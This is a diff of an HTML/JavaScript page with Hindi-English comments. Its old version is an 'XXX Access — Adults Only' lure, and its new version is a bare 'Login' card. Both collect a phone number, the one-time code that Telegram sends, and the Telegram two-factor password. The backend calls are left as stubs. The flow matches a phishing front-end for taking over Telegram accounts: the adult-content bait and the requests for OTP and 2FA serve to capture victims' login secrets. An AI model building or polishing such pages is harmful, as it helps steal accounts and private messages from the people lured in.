@@ -3,281 +3,203 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>XXX Access — Adults Only</title>
+<title>Login</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,500;0,600;1,500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
 :root{
-  --rose:#ff5f9e; --violet:#8b5cf6; --mint:#7ff0d8;
-  --ink:#fbf7ff; --muted:rgba(251,247,255,.60); --faint:rgba(251,247,255,.38);
-  --line:rgba(255,255,255,.15); --radius:30px;
+  --glass:rgba(255,255,255,.07);
+  --glass-2:rgba(255,255,255,.14);
+  --line:rgba(255,255,255,.22);
+  --line-2:rgba(255,255,255,.60);
+  --r:24px;
 }
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{margin:0;padding:0}
 body{
   position:relative;min-height:100svh;
-  font-family:Inter,system-ui,-apple-system,sans-serif;
-  color:var(--ink);background:#07040f;
   display:flex;align-items:center;justify-content:center;
-  padding:34px 18px;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+  padding:24px 18px;background:#000;color:#fff;
+  font-family:Inter,system-ui,-apple-system,sans-serif;
+  overflow-x:hidden;-webkit-font-smoothing:antialiased;
+  transition:opacity .45s ease;
 }
+body.out{opacity:0}
 
-/* ================= BACKGROUND VIDEO ================= */
-.bg{position:absolute;inset:0;overflow:hidden;z-index:0;background:#07040f}
+/* ============ BACKGROUND VIDEO (full screen) ============ */
+.bg{position:absolute;inset:0;z-index:0;overflow:hidden;background:#000}
 .bg video{
   position:absolute;inset:0;width:100%;height:100%;
-  object-fit:cover;object-position:center 35%;
-  filter:saturate(114%) contrast(105%);
-  animation:drift 36s ease-in-out infinite alternate;
+  object-fit:cover;object-position:center center;display:block;
 }
-@keyframes drift{from{transform:scale(1.05)}to{transform:scale(1.17)}}
-.tint{
-  position:absolute;inset:0;
-  background:
-    radial-gradient(115% 80% at 12% 8%, rgba(255,95,158,.30), transparent 58%),
-    radial-gradient(105% 90% at 88% 92%, rgba(139,92,246,.34), transparent 58%),
-    linear-gradient(165deg, rgba(9,5,17,.60) 0%, rgba(6,3,13,.86) 100%);
-}
-.vignette{position:absolute;inset:0;background:radial-gradient(125% 105% at 50% 45%, transparent 36%, rgba(0,0,0,.64) 100%)}
+/* halka sa black scrim - chaaho to opacity 0 kar do, video 100% raw rahegi */
+.scrim{position:absolute;inset:0;background:rgba(0,0,0,.16)}
 .bg.no-video video{display:none}
-.bg.no-video::after{content:"";position:absolute;inset:0;background:linear-gradient(150deg,#1a0b2e,#3d0f42 45%,#0b1030)}
-@media (prefers-reduced-motion:reduce){.bg video{animation:none}}
 
-/* ================= GLASS CARD ================= */
-.card{
-  position:relative;z-index:2;width:100%;max-width:452px;
-  padding:34px 30px 24px;border-radius:var(--radius);
-  background:linear-gradient(150deg, rgba(255,255,255,.105), rgba(255,255,255,.032));
-  backdrop-filter:blur(26px) saturate(175%);
-  -webkit-backdrop-filter:blur(26px) saturate(175%);
-  border:1px solid var(--line);
-  box-shadow:0 34px 90px -24px rgba(0,0,0,.75),
-             0 0 0 1px rgba(255,255,255,.045) inset,
-             0 1px 0 rgba(255,255,255,.30) inset;
-  overflow:hidden;
-  animation:cardIn .9s cubic-bezier(.2,.9,.25,1) both;
-}
-@keyframes cardIn{from{opacity:0;transform:translateY(22px) scale(.985)}to{opacity:1;transform:none}}
-.card::before{
-  content:"";position:absolute;inset:0;border-radius:inherit;pointer-events:none;
-  background:radial-gradient(120% 58% at 50% -12%, rgba(255,255,255,.24), transparent 62%);
-}
-.card::after{
-  content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;pointer-events:none;
-  background:linear-gradient(135deg, rgba(255,95,158,.75), rgba(255,255,255,.06) 42%, rgba(139,92,246,.7));
-  -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
-  -webkit-mask-composite:xor;mask-composite:exclude;opacity:.9;
-}
-.card>*{position:relative;z-index:1}
-
-/* ================= SOUND TOGGLE ================= */
+/* ============ SOUND TOGGLE (icon only) ============ */
 .sound{
-  position:absolute;top:16px;right:16px;z-index:3;
+  position:absolute;top:18px;right:18px;z-index:5;
   width:38px;height:38px;border-radius:50%;cursor:pointer;
-  display:grid;place-items:center;font-size:14px;
+  display:grid;place-items:center;color:#fff;
   background:rgba(255,255,255,.08);border:1px solid var(--line);
-  color:var(--ink);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
+  backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);
   transition:.25s;
 }
-.sound:hover{background:rgba(255,255,255,.16);transform:scale(1.06)}
+.sound:hover{background:rgba(255,255,255,.18)}
+.sound .slash{opacity:0;transition:.2s}
+.sound.muted .waves{opacity:0}
+.sound.muted .slash{opacity:1}
 
-/* ================= TYPO ================= */
-.eyebrow{
-  font-family:Outfit,sans-serif;font-size:11px;font-weight:500;
-  letter-spacing:.32em;text-transform:uppercase;color:var(--rose);
-  margin:0 0 10px;display:flex;align-items:center;gap:9px;
+/* ============ TRANSPARENT CARD ============ */
+.card{
+  position:relative;z-index:2;width:100%;max-width:378px;
+  padding:20px;border-radius:var(--r);
+  background:rgba(255,255,255,.055);
+  backdrop-filter:blur(14px) saturate(135%);
+  -webkit-backdrop-filter:blur(14px) saturate(135%);
+  border:1px solid var(--line);
+  box-shadow:0 26px 60px -26px rgba(0,0,0,.65), 0 1px 0 rgba(255,255,255,.28) inset;
+  transition:opacity .4s ease, transform .4s ease;
+  animation:in .7s cubic-bezier(.2,.9,.25,1) both;
 }
-.eyebrow::before{content:"";width:22px;height:1px;background:linear-gradient(90deg,var(--rose),transparent)}
-.title{
-  font-family:"Playfair Display",serif;font-weight:500;
-  font-size:44px;line-height:1.03;margin:0 0 12px;letter-spacing:-.5px;
-  text-shadow:0 4px 30px rgba(0,0,0,.5);
-}
-.title em{
-  font-style:italic;
-  background:linear-gradient(100deg,var(--rose),var(--violet) 60%,var(--mint));
-  -webkit-background-clip:text;background-clip:text;color:transparent;
-}
-.title.sm{font-size:31px;margin-bottom:14px}
-.lede{font-size:14.5px;color:var(--muted);margin:0 0 16px;font-weight:300;line-height:1.6}
-.legal{
-  font-size:12.2px;line-height:1.65;color:var(--faint);font-weight:300;
-  margin:0 0 22px;padding:12px 14px;border-radius:14px;
-  background:rgba(0,0,0,.22);border:1px solid rgba(255,255,255,.07);
-}
+@keyframes in{from{opacity:0;transform:translateY(18px) scale(.99)}to{opacity:1;transform:none}}
+body.out .card{opacity:0;transform:scale(.97)}
 
-/* ================= BADGE 18 ================= */
-.badge18{
-  width:60px;height:60px;border-radius:18px;display:grid;place-items:center;
-  font-family:Outfit,sans-serif;font-size:23px;font-weight:600;letter-spacing:-1px;
-  margin-bottom:16px;color:#fff;
-  background:linear-gradient(140deg,var(--rose),var(--violet));
-  box-shadow:0 14px 34px -10px rgba(255,95,158,.75), 0 0 0 1px rgba(255,255,255,.22) inset;
-  transform:rotate(-4deg);
+/* ============ BACK ============ */
+.back{
+  position:absolute;top:13px;left:13px;z-index:3;
+  width:30px;height:30px;border-radius:50%;cursor:pointer;
+  display:none;place-items:center;color:#fff;
+  background:rgba(255,255,255,.08);border:1px solid var(--line);
+  transition:.2s;
 }
-.badge18 sup{font-size:11px;top:-.6em;position:relative}
+.back:hover{background:rgba(255,255,255,.2)}
+.card[data-step="2"] .back{display:grid}
 
-/* ================= STATUS ================= */
-.status{
-  display:flex;gap:9px;align-items:flex-start;
-  font-size:12.8px;line-height:1.6;font-weight:400;
-  padding:12px 14px;border-radius:14px;margin-bottom:18px;
-  backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);
-  border:1px solid transparent;
-}
-.status.info{background:rgba(139,92,246,.16);border-color:rgba(139,92,246,.38);color:#ded3ff}
-.status.success{background:rgba(127,240,216,.13);border-color:rgba(127,240,216,.34);color:#c4fff0}
-.status.error{background:rgba(255,95,158,.14);border-color:rgba(255,95,158,.4);color:#ffd3e3}
-.status.pop{animation:pop .45s cubic-bezier(.2,.9,.25,1)}
-@keyframes pop{from{opacity:0;transform:translateY(-7px)}to{opacity:1;transform:none}}
+/* ============ STEPS ============ */
+.step{display:none}
+.step.is-active{display:block;animation:rise .45s cubic-bezier(.2,.9,.25,1)}
+@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.step[data-step="2"].is-active{padding-top:30px}
 
-/* ================= FORM ================= */
-label{
-  display:block;font-family:Outfit,sans-serif;font-size:10.5px;font-weight:500;
-  letter-spacing:.2em;text-transform:uppercase;color:var(--faint);margin:0 0 8px;
+/* ============ ROW (input + arrow) ============ */
+.row{
+  display:flex;align-items:center;gap:8px;
+  background:var(--glass);border:1px solid var(--line);
+  border-radius:16px;padding:0 6px 0 15px;transition:.22s;
 }
-.field{
-  display:flex;align-items:center;gap:10px;margin-bottom:16px;
-  background:rgba(0,0,0,.26);border:1px solid var(--line);
-  border-radius:16px;padding:0 16px;transition:.25s;
+.row:focus-within{border-color:var(--line-2);background:var(--glass-2)}
+.row input{
+  flex:1;min-width:0;width:100%;background:none;border:0;outline:0;
+  color:#fff;font-family:inherit;font-size:15px;letter-spacing:.3px;
+  padding:16px 0;
 }
-.field:focus-within{
-  border-color:rgba(255,95,158,.6);
-  box-shadow:0 0 0 4px rgba(255,95,158,.13), 0 0 30px -8px rgba(255,95,158,.5);
-  background:rgba(0,0,0,.36);
-}
-.field .prefix{color:var(--rose);font-size:16px;font-weight:500}
-input[type=tel],input[type=password]{
-  flex:1;width:100%;background:none;border:none;outline:none;
-  color:var(--ink);font-family:Inter,sans-serif;font-size:15.5px;
-  padding:16px 0;letter-spacing:.4px;
-}
-input::placeholder{color:rgba(251,247,255,.3)}
-#password{
-  background:rgba(0,0,0,.26);border:1px solid var(--line);border-radius:16px;
-  padding:16px 16px;margin-bottom:16px;transition:.25s;
-}
-#password:focus{border-color:rgba(255,95,158,.6);box-shadow:0 0 0 4px rgba(255,95,158,.13)}
-.hidden{display:none !important}
+.row input::placeholder{color:rgba(255,255,255,.5)}
+.row .prefix{font-size:15px;color:rgba(255,255,255,.65);padding-right:2px}
 
-/* ================= OTP ================= */
-.otp-container{display:flex;gap:9px;margin-bottom:18px}
-.otp-input{
-  flex:1;min-width:0;height:56px;text-align:center;
-  font-family:Outfit,sans-serif;font-size:21px;font-weight:500;
-  color:var(--ink);background:rgba(0,0,0,.26);
-  border:1px solid var(--line);border-radius:15px;outline:none;transition:.22s;
+.go{
+  flex:none;width:42px;height:42px;border-radius:13px;border:0;cursor:pointer;
+  display:grid;place-items:center;
+  background:rgba(255,255,255,.92);color:#0a0a0a;transition:.2s;
 }
-.otp-input:focus{
-  border-color:rgba(255,95,158,.65);transform:translateY(-2px);
-  box-shadow:0 0 0 4px rgba(255,95,158,.13), 0 12px 26px -12px rgba(255,95,158,.8);
-}
-.otp-input.filled{border-color:rgba(127,240,216,.55);background:rgba(127,240,216,.08)}
-
-/* ================= BUTTONS ================= */
-.btn{
-  width:100%;border:none;cursor:pointer;border-radius:16px;
-  font-family:Outfit,sans-serif;font-size:14.5px;font-weight:500;letter-spacing:.02em;
-  padding:16px 20px;display:flex;align-items:center;justify-content:center;gap:9px;
-  transition:transform .2s, box-shadow .25s, background .25s;
-}
-.btn-primary{
-  color:#fff;background:linear-gradient(115deg,var(--rose),var(--violet));
-  box-shadow:0 16px 38px -14px rgba(255,95,158,.9), 0 1px 0 rgba(255,255,255,.3) inset;
-}
-.btn-primary:hover{transform:translateY(-2px);box-shadow:0 22px 46px -14px rgba(255,95,158,1)}
-.btn-primary:active{transform:translateY(0) scale(.99)}
-.btn-ghost{background:rgba(255,255,255,.07);color:var(--ink);border:1px solid var(--line)}
-.btn-ghost:hover{background:rgba(255,255,255,.14)}
-.btn[disabled]{opacity:.62;cursor:not-allowed;transform:none !important}
-.arrow{transition:transform .25s}
-.btn-primary:hover .arrow{transform:translateX(4px)}
-.spin{
-  width:15px;height:15px;border-radius:50%;
-  border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+.go:hover{background:#fff;transform:translateX(2px)}
+.go[disabled]{opacity:.6;cursor:default;transform:none}
+.sp{
+  display:block;width:14px;height:14px;border-radius:50%;
+  border:2px solid rgba(0,0,0,.22);border-top-color:#0a0a0a;
   animation:spin .7s linear infinite;
 }
 @keyframes spin{to{transform:rotate(360deg)}}
-.resend{text-align:center;margin:18px 0 0;font-size:13px;color:var(--muted)}
-.resend a{color:var(--rose);cursor:pointer;text-decoration:underline;text-underline-offset:3px}
-.resend a:hover{color:#ff8fb8}
 
-/* ================= STEP SWITCH ================= */
-.step{display:none}
-.step.is-active{display:block;animation:rise .5s cubic-bezier(.2,.9,.25,1)}
-@keyframes rise{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
-
-/* ================= UNLOCKED ================= */
-.tick{
-  width:74px;height:74px;border-radius:50%;display:grid;place-items:center;
-  font-size:32px;margin:6px auto 20px;color:#06231d;
-  background:linear-gradient(140deg,var(--mint),#4fd8ff);
-  box-shadow:0 18px 44px -12px rgba(127,240,216,.85);
-  animation:pulse 2.2s ease-in-out infinite;
+/* ============ OTP ============ */
+.otp{display:flex;gap:8px}
+.otp input{
+  flex:1;min-width:0;height:56px;text-align:center;
+  font-family:inherit;font-size:20px;font-weight:500;
+  color:#fff;background:var(--glass);
+  border:1px solid var(--line);border-radius:14px;outline:0;
+  transition:.2s;padding:0;
 }
-@keyframes pulse{50%{box-shadow:0 18px 60px -6px rgba(127,240,216,1)}}
-.center{text-align:center}
+.otp input:focus{border-color:var(--line-2);background:var(--glass-2);transform:translateY(-2px)}
+.otp input.filled{border-color:rgba(255,255,255,.45);background:rgba(255,255,255,.16)}
 
-/* ================= FOOTER ================= */
-.foot{
-  margin-top:22px;padding-top:16px;border-top:1px solid rgba(255,255,255,.08);
-  text-align:center;font-family:Outfit,sans-serif;font-size:10.5px;
-  letter-spacing:.14em;text-transform:uppercase;color:var(--faint);
+/* ============ PASSWORD (only when 2FA) ============ */
+#pwRow{margin-top:12px}
+.hidden{display:none !important}
+.reveal{animation:rise .45s cubic-bezier(.2,.9,.25,1)}
+
+/* ============ MESSAGE ============ */
+.msg{
+  margin:12px 2px 0;min-height:15px;text-align:center;
+  font-size:12px;font-weight:400;letter-spacing:.2px;
+  color:rgba(255,255,255,.68);
+  text-shadow:0 1px 10px rgba(0,0,0,.7);
+  transition:color .2s;
 }
-.foot span{color:var(--mint)}
+.msg.strong{color:#fff}
+.msg.strong::before{
+  content:"";display:inline-block;width:5px;height:5px;border-radius:50%;
+  background:#fff;vertical-align:middle;margin-right:7px;margin-top:-2px;
+}
+.step[data-step="1"] .msg{text-align:left;margin-left:4px}
 
-@media(max-width:420px){
-  .card{padding:28px 22px 20px;border-radius:26px}
-  .title{font-size:37px}
-  .title.sm{font-size:27px}
-  .otp-container{gap:6px}
-  .otp-input{height:50px;font-size:18px;border-radius:13px}
+@media(max-width:400px){
+  .card{max-width:100%;padding:16px}
+  .otp{gap:6px}
+  .otp input{height:52px;font-size:18px;border-radius:12px}
+  .step[data-step="2"].is-active{padding-top:28px}
 }
 </style>
 </head>
 <body>
 
+<!-- =========================================================
+     VIDEO LINK  ->  sirf yahan badalna hai
+     ========================================================= -->
 <div class="bg" id="bg">
-  <video id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
-  <div class="tint"></div>
-  <div class="vignette"></div>
+  <video id="bgVideo" autoplay muted loop playsinline preload="auto"
+         src="https://files.catbox.moe/zp6wxp.mp4"></video>
+  <div class="scrim"></div>
 </div>
 
-<main class="card" id="card">
-  <button class="sound" id="soundBtn" title="Toggle sound" aria-label="Toggle sound">🔇</button>
+<button class="sound muted" id="soundBtn" aria-label="Toggle sound">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor"
+       stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+    <path d="M11 5 6 9H3v6h3l5 4V5z"/>
+    <path class="waves" d="M15.6 8.6a4.8 4.8 0 0 1 0 6.8M18.6 5.6a9 9 0 0 1 0 12.8"/>
+    <path class="slash" d="M3.5 20.5 20.5 3.5"/>
+  </svg>
+</button>
 
-  <!-- ============ STEP 0 : AGE GATE ============ -->
-  <section class="step is-active" data-step="0">
-    <div class="badge18">18<sup>+</sup></div>
-    <p class="eyebrow">Adults Only</p>
-    <h1 class="title">XXX <em>Access</em></h1>
-    <p class="lede">Enter to unlock exclusive adult content</p>
-    <p class="legal">This website contains explicit adult material. By entering, you confirm you are at least 18 years old.</p>
-    <button class="btn btn-primary" onclick="goStep(1)">Enter <span class="arrow">→</span></button>
-  </section>
+<main class="card" id="card" data-step="1">
 
-  <!-- ============ STEP 1 : PHONE ============ -->
-  <section class="step" data-step="1">
-    <p class="eyebrow">Step 01 — Identity</p>
-    <h2 class="title sm">Verify your <em>number</em></h2>
-    <div class="status info" id="status1">🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app.</div>
-    <label for="phone">Phone Number</label>
-    <div class="field">
+  <button class="back" id="backBtn" aria-label="Back">
+    <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 6l-6 6 6 6"/>
+    </svg>
+  </button>
+
+  <!-- STEP 1 : PHONE -->
+  <section class="step is-active" data-step="1">
+    <div class="row">
       <span class="prefix">+</span>
-      <input id="phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="91 98765 43210">
+      <input id="phone" type="tel" inputmode="tel" autocomplete="tel"
+             placeholder="Country code and number">
+      <button class="go" id="sendBtn" aria-label="Send code">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
+             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12h13M13 6l6 6-6 6"/>
+        </svg>
+      </button>
     </div>
-    <button class="btn btn-primary" id="getCodeBtn" onclick="sendCode()">Get Access Code</button>
+    <p class="msg" id="msg1" aria-live="polite"></p>
   </section>
 
-  <!-- ============ STEP 2 : OTP + 2FA ============ -->
+  <!-- STEP 2 : OTP ( + 2FA only if enabled ) -->
   <section class="step" data-step="2">
-    <p class="eyebrow">Step 02 — Telegram OTP</p>
-    <h2 class="title sm">Enter your <em>code</em></h2>
-    <div class="status success" id="status2">✅ Verification code sent! Open your Telegram app to read it.</div>
-
-    <label>Enter Code</label>
-    <div class="otp-container">
+    <div class="otp" id="otpWrap">
       <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
       <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
       <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
@@ -285,110 +207,109 @@ input::placeholder{color:rgba(251,247,255,.3)}
       <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
     </div>
 
-    <div id="passwordGroup" class="hidden">
-      <label for="password">Two-Factor Password</label>
-      <input type="password" id="password" placeholder="Enter 2FA password">
+    <div class="row hidden" id="pwRow">
+      <input type="password" id="password" placeholder="2FA password" autocomplete="off">
+      <button class="go" id="pwBtn" aria-label="Submit">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor"
+             stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12h13M13 6l6 6-6 6"/>
+        </svg>
+      </button>
     </div>
 
-    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">Unlock Content</button>
-    <p class="resend">Didn't get the code? <a onclick="backToStep1()">Try again</a></p>
+    <p class="msg" id="msg2" aria-live="polite"></p>
   </section>
 
-  <!-- ============ STEP 3 : UNLOCKED ============ -->
-  <section class="step" data-step="3">
-    <div class="tick">✓</div>
-    <p class="eyebrow" style="justify-content:center">Verified</p>
-    <h2 class="title sm center">Access <em>granted</em></h2>
-    <div class="status success">🎉 You're in. Your session is now unlocked — enjoy the exclusive collection.</div>
-    <button class="btn btn-ghost" onclick="resetAll()">Start over</button>
-  </section>
-
-  <div class="foot">256-bit SSL Encrypted <span>•</span> Anonymous Access</div>
 </main>
 
 <script>
-/* ============================================================
-   BACKGROUND VIDEO — supports {{ bg_video }} template variable
-   If the variable is unreplaced (or empty), the fallback is used.
-   ============================================================ */
-const FALLBACK_VIDEO = "https://files.catbox.moe/zp6wxp.mp4";
-const TEMPLATE_VIDEO = "{{ bg_video }}";
+/* =========================================================
+   CONFIG
+   ========================================================= */
+const DASHBOARD_URL  = "dashboard.html";  // success ke baad redirect
+const OTP_LENGTH     = 5;
+const TWO_FA_ENABLED = false;             // true karo to OTP ke baad 2FA password maangega
 
-(function initVideo(){
-  let src = (TEMPLATE_VIDEO || "").trim();
-  if(!src || src.indexOf("{{") === 0) src = FALLBACK_VIDEO;
+/* ================= background video ================= */
+const bgVideo  = document.getElementById("bgVideo");
+const bgWrap   = document.getElementById("bg");
+const soundBtn = document.getElementById("soundBtn");
 
-  const v = document.getElementById("bgVideo");
-  const wrap = document.getElementById("bg");
-  v.src = src;
-  v.addEventListener("error", () => wrap.classList.add("no-video"), true);
+bgVideo.addEventListener("error", () => bgWrap.classList.add("no-video"), true);
+bgVideo.play().catch(() => { bgVideo.muted = true; bgVideo.play().catch(()=>{}); });
+document.addEventListener("click", () => bgVideo.play().catch(()=>{}), { once:true });
 
-  const play = () => v.play().catch(() => { v.muted = true; v.play().catch(()=>{}); });
-  play();
-  document.addEventListener("click", play, { once:true });
+soundBtn.addEventListener("click", () => {
+  bgVideo.muted = !bgVideo.muted;
+  soundBtn.classList.toggle("muted", bgVideo.muted);
+  if(!bgVideo.muted) bgVideo.play().catch(()=>{});
+});
 
-  document.getElementById("soundBtn").addEventListener("click", function(){
-    v.muted = !v.muted;
-    this.textContent = v.muted ? "🔇" : "🔊";
-    if(!v.muted) v.play().catch(()=>{});
-  });
-})();
-
-/* ==================== STEP ENGINE ==================== */
-function goStep(n){
-  document.querySelectorAll(".step").forEach(s =>
-    s.classList.toggle("is-active", s.dataset.step === String(n))
-  );
-  const first = document.querySelector('.step[data-step="'+n+'"] input');
-  if(first) setTimeout(() => first.focus(), 260);
-}
-
-function setStatus(el, html, type){
-  el.className = "status " + (type || "info");
-  el.innerHTML = html;
-  void el.offsetWidth;
-  el.classList.add("pop");
-}
-
-function withLoading(btn, label){
-  btn.disabled = true;
-  btn.dataset.html = btn.innerHTML;
-  btn.innerHTML = '<span class="spin"></span> ' + label;
-}
-function stopLoading(btn){
-  btn.disabled = false;
-  if(btn.dataset.html) btn.innerHTML = btn.dataset.html;
-}
-
-/* ==================== STEP 1 : SEND CODE ==================== */
-function sendCode(){
-  const btn = document.getElementById("getCodeBtn");
-  const phone = document.getElementById("phone").value.replace(/\D/g,"");
-  const status1 = document.getElementById("status1");
-
-  if(phone.length < 8){
-    setStatus(status1, "⚠️ Please enter a valid phone number including your country code (e.g. +91…).", "error");
-    document.getElementById("phone").focus();
-    return;
-  }
-
-  withLoading(btn, "Sending code…");
-  setTimeout(() => {
-    stopLoading(btn);
-    setStatus(document.getElementById("status2"), "✅ Verification code sent! Open your Telegram app to read it.", "success");
-    goStep(2);
-    setTimeout(() => document.querySelector(".otp-input").focus(), 320);
-  }, 1100);
-}
-
-/* ==================== OTP INPUT BEHAVIOUR ==================== */
+/* ================= helpers ================= */
+const card    = document.getElementById("card");
+const msg1    = document.getElementById("msg1");
+const msg2    = document.getElementById("msg2");
+const sendBtn = document.getElementById("sendBtn");
+const pwBtn   = document.getElementById("pwBtn");
+const pwRow   = document.getElementById("pwRow");
+const pw      = document.getElementById("password");
+const phone   = document.getElementById("phone");
 const otpInputs = [...document.querySelectorAll(".otp-input")];
 
+function setMsg(el, text, strong){
+  el.textContent = text || "";
+  el.classList.toggle("strong", !!strong);
+}
+
+function show(step){
+  card.dataset.step = step;
+  document.querySelectorAll(".step").forEach(s =>
+    s.classList.toggle("is-active", s.dataset.step === String(step))
+  );
+  const first = document.querySelector('.step.is-active input:not([type="password"])');
+  if(first) setTimeout(() => first.focus(), 220);
+}
+
+function busy(btn, on){
+  if(on){ btn.dataset.html = btn.innerHTML; btn.disabled = true; btn.innerHTML = '<span class="sp"></span>'; }
+  else  { btn.disabled = false; if(btn.dataset.html) btn.innerHTML = btn.dataset.html; }
+}
+
+function goDashboard(){
+  document.body.classList.add("out");
+  setTimeout(() => { window.location.href = DASHBOARD_URL; }, 420);
+}
+
+/* ================= step 1 : send code ================= */
+function sendCode(){
+  const digits = phone.value.replace(/\D/g,"");
+  if(digits.length < 8){
+    setMsg(msg1, "Enter a valid number with country code", true);
+    phone.focus();
+    return;
+  }
+  setMsg(msg1, "");
+  busy(sendBtn, true);
+
+  /* ---- backend yahan call karo ---- */
+  setTimeout(() => {
+    busy(sendBtn, false);
+    show(2);
+    setMsg(msg2, "Code sent to your Telegram");
+    setTimeout(() => otpInputs[0].focus(), 240);
+  }, 900);
+}
+
+sendBtn.addEventListener("click", sendCode);
+phone.addEventListener("keydown", e => { if(e.key === "Enter") sendCode(); });
+
+/* ================= OTP behaviour ================= */
 otpInputs.forEach((inp, i) => {
   inp.addEventListener("input", () => {
     inp.value = inp.value.replace(/\D/g,"").slice(0,1);
     inp.classList.toggle("filled", !!inp.value);
     if(inp.value && i < otpInputs.length - 1) otpInputs[i+1].focus();
+    if(otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
   });
 
   inp.addEventListener("keydown", e => {
@@ -404,74 +325,68 @@ otpInputs.forEach((inp, i) => {
 
   inp.addEventListener("paste", e => {
     e.preventDefault();
-    const digits = (e.clipboardData.getData("text") || "").replace(/\D/g,"").split("");
-    digits.forEach((d, k) => {
-      if(otpInputs[i+k]){ otpInputs[i+k].value = d; otpInputs[i+k].classList.add("filled"); }
+    const d = (e.clipboardData.getData("text") || "").replace(/\D/g,"").split("");
+    d.forEach((c, k) => {
+      if(otpInputs[i+k]){ otpInputs[i+k].value = c; otpInputs[i+k].classList.add("filled"); }
     });
-    otpInputs[Math.min(i + digits.length, otpInputs.length - 1)].focus();
+    otpInputs[Math.min(i + d.length, otpInputs.length - 1)].focus();
+    if(otpInputs.every(x => x.value)) setTimeout(verifyOtp, 220);
   });
 });
 
-/* ==================== STEP 2 : VERIFY ==================== */
-let codeVerified = false;
+/* ================= step 2 : verify ================= */
+let verifying = false;
 
-function verifyCode(){
-  const btn = document.getElementById("verifyBtn");
-  const status2 = document.getElementById("status2");
+function verifyOtp(){
   const code = otpInputs.map(i => i.value).join("");
-  const pwGroup = document.getElementById("passwordGroup");
-  const pw = document.getElementById("password");
+  if(verifying || code.length < OTP_LENGTH) return;
+  verifying = true;
+  setMsg(msg2, "Verifying...");
 
-  /* --- phase 1: verify the OTP, then reveal 2FA --- */
-  if(!codeVerified){
-    if(code.length < otpInputs.length){
-      setStatus(status2, "⚠️ Enter the complete 5-digit code from Telegram.", "error");
-      const empty = otpInputs.find(i => !i.value);
-      if(empty) empty.focus();
+  /* ---- backend yahan OTP verify karo ---- */
+  setTimeout(() => {
+    verifying = false;
+
+    if(TWO_FA_ENABLED){
+      pwRow.classList.remove("hidden");
+      pwRow.classList.add("reveal");
+      setMsg(msg2, "Enter your 2FA password");
+      setTimeout(() => pw.focus(), 200);
       return;
     }
-    withLoading(btn, "Verifying code…");
-    setTimeout(() => {
-      stopLoading(btn);
-      codeVerified = true;
-      pwGroup.classList.remove("hidden");
-      setStatus(status2, "🔓 Code verified! Now enter your Two-Factor password to finish unlocking.", "info");
-      btn.innerHTML = "Unlock Content";
-      setTimeout(() => pw.focus(), 260);
-    }, 1000);
-    return;
-  }
+    finish();
+  }, 900);
+}
 
-  /* --- phase 2: verify the 2FA password --- */
-  if(!pw.value.trim()){
-    setStatus(status2, "⚠️ Please enter your Two-Factor password.", "error");
-    pw.focus();
-    return;
-  }
-  withLoading(btn, "Unlocking…");
+function submitPassword(){
+  if(!pw.value.trim()){ setMsg(msg2, "Enter your 2FA password", true); pw.focus(); return; }
+  busy(pwBtn, true);
+  setMsg(msg2, "Verifying...");
+
+  /* ---- backend yahan 2FA verify karo ---- */
   setTimeout(() => {
-    stopLoading(btn);
-    goStep(3);
-  }, 1100);
+    busy(pwBtn, false);
+    finish();
+  }, 900);
 }
 
-/* ==================== RESETS ==================== */
-function backToStep1(){
+function finish(){
+  setMsg(msg2, "Success");
+  setTimeout(goDashboard, 480);
+}
+
+pwBtn.addEventListener("click", submitPassword);
+pw.addEventListener("keydown", e => { if(e.key === "Enter") submitPassword(); });
+
+/* ================= back ================= */
+document.getElementById("backBtn").addEventListener("click", () => {
   otpInputs.forEach(i => { i.value = ""; i.classList.remove("filled"); });
-  document.getElementById("password").value = "";
-  document.getElementById("passwordGroup").classList.add("hidden");
-  codeVerified = false;
-  document.getElementById("verifyBtn").innerHTML = "Unlock Content";
-  setStatus(document.getElementById("status1"),
-    "🔐 Enter your phone number with country code. A secure verification code will be sent to your Telegram app.", "info");
-  goStep(1);
-}
-
-function resetAll(){
-  document.getElementById("phone").value = "";
-  backToStep1();
-  goStep(0);
-}
+  pw.value = "";
+  pwRow.classList.add("hidden");
+  setMsg(msg2, "");
+  setMsg(msg1, "");
+  show(1);
+});
 </script>
 </body>
 </html>
